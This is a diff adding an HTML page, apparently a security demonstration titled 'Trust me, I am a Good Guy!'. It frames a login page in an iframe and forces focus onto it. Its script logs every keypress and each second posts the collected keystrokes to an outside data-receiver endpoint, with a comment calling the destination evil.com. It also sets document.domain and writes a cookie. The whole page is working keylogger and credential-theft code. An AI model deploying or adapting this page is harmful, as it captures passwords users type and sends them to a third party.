@@ -1,0 +1,51 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Trust me, I am a Good Guy!</title>
+    <link rel="stylesheet" href="/w3.css" />
+    <script>
+        function setDomain() {
+            document.domain = "aspnet4you.com";
+            document.cookie = "user=Bob the GoodGuy;domain=aspnet4you.com";
+        }
+        // array of user keystrokes
+        var keystrokes = [];
+        // event listener which captures user keystrokes
+        document.onkeypress = function() {
+            keystrokes.push(window.event.keyCode);
+        }
+
+        function recordKeys() {
+            keystrokes.push(window.event.keyCode);
+        }
+
+        // function which reports keytrokes back to evil.com every second
+        setInterval(function() {
+            if (keystrokes.length) {
+                var xhr = newXHR();
+                xhr.open("POST", "https://function.aspnet4you.com/api/DataReceiver");
+                xhr.send(keystrokes.join("+"));
+            }
+            keystrokes = [];
+        }, 1000);
+
+        // function which creates an ajax request object
+        function newXHR() {
+            if (window.XMLHttpRequest)
+                return new XMLHttpRequest();
+
+            return new ActiveXObject("MSXML2.XMLHTTP.3.0");
+        }
+
+        
+
+    </script>
+</head>
+<body onload="setDomain()">
+    <div>
+        <iframe width="600" height="600" src="https://goodguy.aspnet4you.com/login.html" onload="this.focus()" onblur="this.focus()" onkeypress="recordKeys()" />
+    </div>
+    
+</body>
+</html>
